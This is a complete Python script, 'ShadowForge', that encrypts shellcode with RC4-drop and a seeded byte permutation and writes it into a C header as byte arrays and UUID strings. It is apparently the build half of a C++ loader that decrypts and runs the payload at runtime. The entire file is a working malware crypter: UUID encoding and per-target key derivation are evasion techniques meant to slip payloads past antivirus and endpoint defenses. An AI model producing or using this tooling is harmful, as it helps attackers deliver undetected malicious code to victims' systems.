#!/usr/bin/env python3
"""
ShadowForge â€” Offline shellcode encryption tool.
Mirrors the C++ runtime decryption pipeline: RC4-drop(3072) + Fisher-Yates permutation.
Outputs a C header with encrypted byte array and UUID-encoded strings.

Usage:
  python3 encrypt_shellcode.py payload.bin -o encrypted.h
  python3 encrypt_shellcode.py --hex "FC4883E4F0..." -o encrypted.h
  python3 encrypt_shellcode.py payload.bin --key-string "target_id" -o encrypted.h
"""

import sys, struct, argparse, os

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    a, b = 0, 0
    for _ in range(3072):
        a = (a + 1) & 0xFF; b = (b + S[a]) & 0xFF; S[a], S[b] = S[b], S[a]
    out = bytearray(len(data))
    for k in range(len(data)):
        a = (a + 1) & 0xFF; b = (b + S[a]) & 0xFF; S[a], S[b] = S[b], S[a]
        out[k] = data[k] ^ S[(S[a] + S[b]) & 0xFF]
    return bytes(out)

class LCG:
    def __init__(self, seed):
        self.state = seed & 0xFFFFFFFF
    def next(self):
        self.state = (self.state * 1664525 + 1013904223) & 0xFFFFFFFF
        return self.state

def permute(data: bytearray, seed: int) -> bytearray:
    rng = LCG(seed)
    arr = bytearray(data)
    for i in range(len(arr) - 1, 0, -1):
        j = rng.next() % (i + 1)
        arr[i], arr[j] = arr[j], arr[i]
    return arr

def encode_uuids(data: bytes) -> list:
    padded = data + bytes((-len(data)) % 16)
    uuids = []
    for i in range(0, len(padded), 16):
        c = padded[i:i+16]
        uuids.append(f"{c[3]:02X}{c[2]:02X}{c[1]:02X}{c[0]:02X}-{c[5]:02X}{c[4]:02X}-"
                     f"{c[7]:02X}{c[6]:02X}-{c[8]:02X}{c[9]:02X}-"
                     f"{c[10]:02X}{c[11]:02X}{c[12]:02X}{c[13]:02X}{c[14]:02X}{c[15]:02X}")
    return uuids

def fnv1a(data: bytes) -> int:
    h = 0x811C9DC5
    for b in data: h = ((h ^ b) * 0x01000193) & 0xFFFFFFFF
    return h

def derive_key(s: str) -> bytes:
    h = fnv1a(s.encode())
    key = bytearray(32)
    for i in range(32):
        h = fnv1a(bytes([i, (h>>24)&0xFF, (h>>16)&0xFF, (h>>8)&0xFF, h&0xFF]))
        key[i] = h & 0xFF
    return bytes(key)

def main():
    ap = argparse.ArgumentParser(description="ShadowForge Shellcode Encryptor")
    ap.add_argument("file", nargs='?')
    ap.add_argument("--hex")
    ap.add_argument("--key")
    ap.add_argument("--key-string")
    ap.add_argument("--seed", type=int)
    ap.add_argument("-o", "--output", default="encrypted_shellcode.h")
    args = ap.parse_args()

    if args.hex:
        raw = bytes.fromhex(args.hex.replace(" ", ""))
    elif args.file:
        with open(args.file, 'rb') as f: raw = f.read()
    else:
        ap.error("Provide shellcode file or --hex")

    key = bytes.fromhex(args.key) if args.key else derive_key(args.key_string) if args.key_string else os.urandom(32)
    seed = args.seed or struct.unpack('<I', os.urandom(4))[0]

    print(f"[*] Size: {len(raw)}  Key: {key.hex()[:16]}...  Seed: 0x{seed:08X}")

    enc = permute(bytearray(rc4(key, raw)), seed)
    uuids = encode_uuids(bytes(enc))

    with open(args.output, 'w') as f:
        f.write(f"#pragma once\n// Generated by ShadowForge encrypt_shellcode.py\n\n")
        f.write(f"static const size_t ENCRYPTED_LEN = {len(enc)};\n")
        f.write(f"static const uint32_t PERM_SEED = 0x{seed:08X}u;\n\n")
        f.write("static const uint8_t ENCRYPTED[] = {\n")
        for i in range(0, len(enc), 16):
            f.write("    " + ", ".join(f"0x{b:02X}" for b in enc[i:i+16]) + ",\n")
        f.write("};\n\nstatic const char* SHELLCODE_UUIDS[] = {\n")
        for u in uuids: f.write(f'    "{u}",\n')
        f.write("};\n" + f"static const size_t UUID_COUNT = {len(uuids)};\n")

    print(f"[+] Written: {args.output}")
    if not args.key_string and not args.key:
        print(f"[!] Random key: {key.hex()}")

if __name__ == "__main__":
    main()
